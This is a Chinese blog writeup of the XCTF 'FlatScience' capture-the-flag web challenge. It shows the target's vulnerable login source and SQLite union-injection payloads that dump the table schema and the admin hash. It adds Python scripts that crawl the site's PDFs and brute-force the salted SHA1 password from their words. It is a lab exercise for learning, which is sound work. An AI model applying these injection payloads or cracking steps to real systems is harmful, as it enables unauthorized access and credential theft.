---
title: XCTF攻防世界web部分writeup
date: 2019-05-01 18:15:34
tags:writeup
---

adword里面题目很多，挑一些题目来记录



## FlatScience

进入题目界面

![](https://qqx.im/mdimage/adword/paper.png)

随便点点之后，发现是一些网站。使用Burpsuite的**Send to Spiders**功能



![](https://qqx.im/mdimage/adword/spider.png)

可以看到有login.php和admin.php和robots.txt，访问robots.txt里面也是login.php和admin.php,所以分别访问login.php和admin.php

看到登录框自然是想要SQL注入fuzz一波。提交admin'会报错

> **Warning**:  SQLite3::query(): Unable to prepare statement: 1, near "fa27f6dc1fec7b2c54fd77ce7f0118fb2a3ab180": syntax error in **/var/www/html/login.php** on line **47**

再提交admin' or '1'='1'--可以成功登录，跳到主页。发现还是没有什么，回登录界面查看。抓包提交发现源代码有tips

```
<!-- TODO: Remove ?debug-Parameter! -->
```

加上这个参数提交得到源码

```php
<?php
ob_start();
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">

<html>
<head>
<style>
blockquote { background: #eeeeee; }
h1 { border-bottom: solid black 2px; }
h2 { border-bottom: solid black 1px; }
.comment { color: darkgreen; }
</style>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Login</title>
</head>
<body>


<div align=right class=lastmod>
Last Modified: Fri Mar  31:33:7 UTC 1337
</div>

<h1>Login</h1>

Login Page, do not try to hax here plox!<br>


<form method="post">
  ID:<br>
  <input type="text" name="usr">
  <br>
  Password:<br> 
  <input type="text" name="pw">
  <br><br>
  <input type="submit" value="Submit">
</form>

<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?>
<!-- TODO: Remove ?debug-Parameter! --> 
```

简单的拼接逻辑，并且会在cookie中回显。

那就查看一下sqlite的注入方式，[参考链接](http://www.sohu.com/a/256295275_609556)

列数可以从代码中看出来为2，接下来爆表。sqlite没库的概念，可以直接获得表名

> usr=admin' union select 1,name from sqlite_master where type='table' limit 0,1--&pw=1

![](https://qqx.im/mdimage/adword/attack.png)

这里只有一个表，如果想报全部的表可以用burpsuite修改limit后面的参数。

接下来报列

> usr=admin' union select 1,sql from sqlite_master where type='table' limit 0,1--&pw=1

结果：

> name= CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))

看hint

> usr=2' union select 1,hint from Users where name='admin'--&pw=1

结果

> name= my fav word in my fav paper?!;

获得admin密码

> usr=2' union select 1,password from Users where name='admin'--&pw=1

结果

> 3fab54a50e770d830c0416df817567662a9dc85c

cmd5查不到，行吧，要去paper里找。那就写个爬虫脚本和解析pdf爆破密码的脚本

爬虫脚本

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# @Time    : 2019/5/1 11:19
# @Author  : wulasite
# @Email   : wulasite@gmail.com
# @File    : python.py
# @Software: PyCharm

import pybloom_live
import queue
import requests
import re
from urllib.parse import urljoin
from function import download_pdf,get_ext


target_url = 'http://111.198.29.45:45002/1/index.html'
q = queue.Queue()
# init the queue
q.put(target_url)
# bloom filter init
f = pybloom_live.BloomFilter(capacity=1000, error_rate=0.001)

# 布隆过滤器 去除重复url
def bloom(base_url, urls):
    for i in urls:
        new_url = urljoin(base_url, i)
        if not f.add(new_url):
            if get_ext(new_url) == '.pdf':
                download_pdf(new_url)
            else:
                q.put(new_url)



# 获取网页的所有内容
def get_content_urls(url):
    try:
        r = requests.get(url, timeout=15)
        text = r.text
        pattern = re.compile('<a.+?href=\"(.+?)\".+?>.+?<\/a>')
        urls = pattern.findall(text)
        # print(urls)
        bloom(url, urls)
    except requests.exceptions.MissingSchema as e:
        print("捕不完的异常")
    except requests.exceptions.ConnectTimeout as e:
        print("捕不完的异常")


if __name__ == '__main__':
    while not q.empty():
        url = q.get()
        print(url)
        get_content_urls(url)


```

用了一个队列和布隆过滤器，很快就爬完pdf了。

然后再写一个pdf解析器

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# @Time    : 2019/5/1 11:19
# @Author  : wulasite
# @Email   : wulasite@gmail.com
# @File    : readpdf.py
# @Software: PyCharm

from pdfminer.pdfparser import PDFParser,PDFDocument
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
from pdfminer.converter import PDFPageAggregator
from pdfminer.layout import LTTextBoxHorizontal,LAParams
from pdfminer.pdfinterp import PDFTextExtractionNotAllowed
import os
import re
from function import get_sha1



def get_pdf():
    return [i for i in os.listdir("./tmp") if i.endswith("pdf")]


def convert_pdf_2_text(path):
    with open(path, 'rb') as fp:
        # 用文件对象来创建一个pdf文档分析器
        praser = PDFParser(fp)
        # 创建一个PDF文档
        doc = PDFDocument()
        # 连接分析器 与文档对象
        praser.set_document(doc)
        doc.set_parser(praser)

        # 提供初始化密码
        # 如果没有密码 就创建一个空的字符串
        doc.initialize()

        # 检测文档是否提供txt转换，不提供就忽略
        if not doc.is_extractable:
            raise PDFTextExtractionNotAllowed
        else:
            # 创建PDf 资源管理器 来管理共享资源
            rsrcmgr = PDFResourceManager()
            # 创建一个PDF设备对象
            laparams = LAParams()
            device = PDFPageAggregator(rsrcmgr, laparams=laparams)
            # 创建一个PDF解释器对象
            interpreter = PDFPageInterpreter(rsrcmgr, device)

            res = ''
            # 循环遍历列表，每次处理一个page的内容
            for page in doc.get_pages():
                interpreter.process_page(page)
                # 接受该页面的LTPage对象
                layout = device.get_result()
                # 这里layout是一个LTPage对象 里面存放着 这个page解析出的各种对象 一般包括LTTextBox, LTFigure, LTImage, LTTextBoxHorizontal 等等 想要获取文本就获得对象的text属性，
                for x in layout:
                    if isinstance(x, LTTextBoxHorizontal):
                        res += x.get_text().strip()
                        # print(res)
            return res


def find_password():
    pdf_path = get_pdf()

    for i in pdf_path:
        print("Searching word in " + i)
        pdf_text = convert_pdf_2_text('tmp/'+i)
        # 这里的分隔符用空格和回车就够了，主要是分割出单词
        pdf_text = re.split(' | \n', pdf_text)
        for word in pdf_text:
            print(word)
            enc_word = word + 'Salz!'
            sha1_password = get_sha1(enc_word)
            if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
                print("Find the password :" + word)
                exit()

if __name__ == '__main__':
    find_password()

```

```python

def get_sha1(s):
    return hashlib.sha1(str(s).encode('utf-8')).hexdigest()
    
def download_pdf(url):
    r = requests.get(url, stream=True, timeout=15)

    filename = os.path.basename(url)
    with open('tmp/'+filename, 'wb') as fd:
        fd.write(r.content)
```

这脚本写了挺久，主要是一开始想着用多线程做生成者和消费者队列，结果发现爬虫本身就是自销自产。然后用布隆过滤器去重，防止死循环。

最后就可以跑出密码

>ThinJerboa
>Find the password :ThinJerboa

登录admin界面即可得到密码





\>\>continue on




